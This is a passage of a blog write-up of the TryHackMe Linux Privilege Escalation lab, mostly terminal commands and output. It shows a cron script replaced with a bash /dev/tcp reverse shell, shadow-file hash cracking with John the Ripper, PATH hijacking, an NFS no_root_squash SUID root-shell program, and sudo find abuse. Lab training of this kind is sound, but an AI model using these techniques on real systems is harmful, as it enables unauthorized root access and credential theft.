</pre></table></code></div></div><h4 id="modify-job-file-with-reverse-shell"><span class="me-2">Modify job file with reverse shell</span><a href="#modify-job-file-with-reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>karen@ip-10-10-6-10:~$ find / -name "flag5.txt" 2&gt;/dev/null
/home/ubuntu/flag5.txt
karen@ip-10-10-6-10:~$ cat /home/ubuntu/flag5.txt
cat: /home/ubuntu/flag5.txt: Permission denied

karen@ip-10-10-6-10:~$ vi /home/karen/backup.sh
karen@ip-10-10-6-10:~$ cat /home/karen/backup.sh
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.2.53.143/6666 0&gt;&amp;1
karen@ip-10-10-6-10:~$ chmod 777 /home/karen/backup.sh
</pre></table></code></div></div><h4 id="listen-for-reverse-shell"><span class="me-2">Listen for reverse shell</span><a href="#listen-for-reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>──(user㉿host1)-[~/Downloads]
└─$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.2.53.143] from (UNKNOWN) [10.10.6.10] 55212
bash: cannot set terminal process group (13073): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-6-10:~# cat /home/ubuntu/flag5.txt
cat /home/ubuntu/flag5.txt
THM-*********
</pre></table></code></div></div><h4 id="use-john-the-ripper-to-crack-1"><span class="me-2">Use John the ripper to crack</span><a href="#use-john-the-ripper-to-crack-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>cat /etc/shadow
...
matt:$6$*****************************************************************************************:18798:0:99999:7:::

┌──(user㉿host1)-[~/Downloads]
└─$ vi matt

┌──(user㉿host1)-[~/Downloads]
└─$ cat matt
matt:$6$*****************************************************************************************:18798:0:99999:7:::

┌──(user㉿host1)-[~/Downloads]
└─$ john matt
...
Proceeding with wordlist:/usr/share/john/password.lst
******           (matt)     
...
</pre></table></code></div></div><h2 id="path"><span class="me-2">PATH</span><a href="#path" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>PATH is an environmental variable that tells the operating system where to search for executables when they are not built into the shell or defined with an absolute path.</p><h4 id="view-the-path"><span class="me-2">View the PATH</span><a href="#view-the-path" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>karen@ip-10-10-53-18:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</pre></table></code></div></div><h4 id="find-writable-folders"><span class="me-2">Find writable folders</span><a href="#find-writable-folders" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>karen@ip-10-10-53-18:/$ find / -writable 2&gt;/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
...
home/*******
...
tmp
...
</pre></table></code></div></div><h4 id="find-the-flag"><span class="me-2">Find the flag</span><a href="#find-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>karen@ip-10-10-53-18:/$ find / -name "flag6.txt" 2&gt;/dev/null
/home/matt/flag6.txt

karen@ip-10-10-53-18:/$ cat /home/matt/flag6.txt
cat: /home/matt/flag6.txt: Permission denied
</pre></table></code></div></div><h4 id="explore-writable-folder"><span class="me-2">Explore writable folder</span><a href="#explore-writable-folder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>karen@ip-10-10-53-18:/tmp$ ls -l /home/*******/
total 24
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py

karen@ip-10-10-53-18:/tmp$ cat /home/murdoch/thm.py
/usr/bin/python3

import os
import sys

try:
        os.system("thm")
except:
        sys.exit()
</pre></table></code></div></div><h4 id="abuse-path-to-run-attack"><span class="me-2">Abuse PATH to run attack</span><a href="#abuse-path-to-run-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>karen@ip-10-10-53-18:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
export PATH=/tmp:$PATH
karen@ip-10-10-53-18:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

karen@ip-10-10-53-18:/tmp$ vi /tmp/thm
karen@ip-10-10-53-18:/tmp$ cat /tmp/thm
cat /home/matt/flag6.txt
karen@ip-10-10-53-18:/tmp$
karen@ip-10-10-53-18:/tmp$
karen@ip-10-10-53-18:/tmp$ /home/murdoch/test
THM-736628929
</pre></table></code></div></div><h2 id="nfs"><span class="me-2">NFS</span><a href="#nfs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>NFS configuration can be found in /etc/exports. If an NFS share is configured with “no_root_squash”, NFS will not change the root user to “nfsnobody” and will not strip files from operating with root privileges. An attacker could create an executable with SUID bit set and run it on the target system.</p><h4 id="check-nfs-config-for-no_root_squash"><span class="me-2">Check nfs config for no_root_squash</span><a href="#check-nfs-config-for-no_root_squash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>karen@ip-10-10-39-217:/$ cat /etc/exports
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
</pre></table></code></div></div><h4 id="enumerate-mountable-shares-from-attack-machine"><span class="me-2">Enumerate mountable shares from attack machine</span><a href="#enumerate-mountable-shares-from-attack-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>root@ip-10-10-181-118:~# showmount -e 10.10.39.217
Export list for 10.10.39.217:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
</pre></table></code></div></div><h4 id="mount-a-no_root_squash-share"><span class="me-2">Mount a no_root_squash share</span><a href="#mount-a-no_root_squash-share" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@ip-10-10-181-118:/tmp/backupsonattackermachine# mkdir /tmp/tmponattackermachine
root@ip-10-10-181-118:/tmp/backupsonattackermachine# mount -o rw 10.10.39.217:/tmp/ /tmp/tmponattackermachine/
root@ip-10-10-181-118:/tmp/backupsonattackermachine# cd /tmp/tmponattackermachine/
</pre></table></code></div></div><h4 id="compile-an-exploit"><span class="me-2">Compile an exploit</span><a href="#compile-an-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>┌──(root㉿kali)-[~]
└─# vi nfs.c                                                                                                     

┌──(root㉿kali)-[~]
└─# cat nfs.c                                                                                                    
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}

┌──(root㉿kali)-[~]
└─# gcc nfs.c -o nfs -w

┌──(root㉿kali)-[~]
└─# chmod +s nfs                                                                                                 

┌──(root㉿kali)-[~]
└─# ls -l                                                                                                 
...
-rwsr-sr-x 1 root root 16056 Jan 21 10:18 nfs
...
</pre></table></code></div></div><h4 id="run-exploit-using-victim"><span class="me-2">Run exploit using victim</span><a href="#run-exploit-using-victim" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>karen@ip-10-10-39-217:/tmp$ ./nfs
root@ip-10-10-39-217:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
root@ip-10-10-39-217:/tmp# whoami
root

root@ip-10-10-39-217:/tmp# find / -name "flag7.txt"
/home/matt/flag7.txt
root@ip-10-10-39-217:/tmp# cat /home/matt/flag7.txt
THM-********
</pre></table></code></div></div><h2 id="capstone-challenge"><span class="me-2">Capstone Challenge</span><a href="#capstone-challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h4 id="explore-target-system"><span class="me-2">Explore target system</span><a href="#explore-target-system" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[leonard@ip-10-10-167-52 ~]$ uname -a
Linux ip-10-10-167-52 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

[leonard@ip-10-10-167-52 ~]$ cat /proc/version
Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020
</pre></table></code></div></div><h4 id="crack-passwords-using-john-the-ripper"><span class="me-2">Crack passwords using John the Ripper</span><a href="#crack-passwords-using-john-the-ripper" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>[leonard@ip-10-10-167-52 ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash

[leonard@ip-10-10-167-52 ~]$ base64 /etc/shadow | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::

──(user㉿host1)-[~/Downloads/12]
└─$ vi password  

┌──(user㉿host1)-[~/Downloads/12]
└─$ cat password  
root:x:0:0:root:/root:/bin/bash
missy:x:1001:1001::/home/missy:/bin/bash

┌──(user㉿host1)-[~/Downloads/12]
└─$ vi shadow  

┌──(user㉿host1)-[~/Downloads/12]
└─$ cat shadow  
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::

┌──(user㉿host1)-[~/Downloads/12]
└─$ unshadow password shadow &gt; unshadowed

┌──(user㉿host1)-[~/Downloads/12]
└─$ cat unshadowed
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51:0:0:root:/root:/bin/bash
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:1001:1001::/home/missy:/bin/bash

┌──(user㉿host1)-[~/Downloads/12]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*********        (missy)
</pre></table></code></div></div><h4 id="read-flag1"><span class="me-2">Read flag1</span><a href="#read-flag1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[missy@ip-10-10-167-52 ~]$ cat /home/missy/Documents/flag1.txt
THM-**************
</pre></table></code></div></div><h4 id="check-users-privileges"><span class="me-2">Check user’s privileges</span><a href="#check-users-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>[missy@ip-10-10-167-52 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-167-52:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-167-52:
    (ALL) NOPASSWD: /usr/bin/find
</pre></table></code></div></div><h4 id="escalate-privileges"><span class="me-2">Escalate privileges</span><a href="#escalate-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[missy@ip-10-10-167-52 ~]$ sudo find /home -exec /bin/bash \;
[root@ip-10-10-167-52 missy]# whoami
root
</pre></table></code></div></div><h4 id="read-flag2"><span class="me-2">Read flag2</span><a href="#read-flag2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[root@ip-10-10-167-52 missy]# ls -l /home/rootflag/
total 4
-rw-r--r--. 1 root root 20 Jun  7  2021 flag2.txt
[root@ip-10-10-167-52 missy]# cat /home/rootflag/flag2.txt
THM-***************
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/tryhackme-linux-privilege-escalation/">TryHackMe: Linux Privilege Escalation</a></ul></section><section><h2 class="panel-heading">Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/write-up/">write-up</a></div></section></div><section id="toc-wrapper" class="ps-0 pe-4"><h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"> <script type="text/javascript"> (function () { const origin = 'https://giscus.app'; const iframe = 'iframe.giscus-frame'; const lightTheme = 'light'; const darkTheme = 'dark_dimmed'; let initTheme = lightTheme; const html = document.documentElement; if ( (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') || (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches) ) { initTheme = darkTheme; } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'millerj/millerj.github.io', 'data-repo-id': 'R_kgDOLF9WCw', 'data-category': 'Announcements', 'data-category-id': 'DIC_kwDOLF9WC84CcjoG', 'data-mapping': 'pathname', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': 'en', 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusScript = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value) ); document.getElementById('tail-wrapper').appendChild(giscusScript); addEventListener('message', (event) => { if ( event.source === window && event.data && event.data.direction === ModeToggle.ID ) { /* global theme mode changed */ const mode = event.data.message; const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme; const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); })(); </script><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p> © <time>2024</time> <a href="">Joe Miller</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution-NonCommercial 4.0 International (CC BY-NC 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/write-up/">write-up</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-JH17XD4B5H"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-JH17XD4B5H'); }); </script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
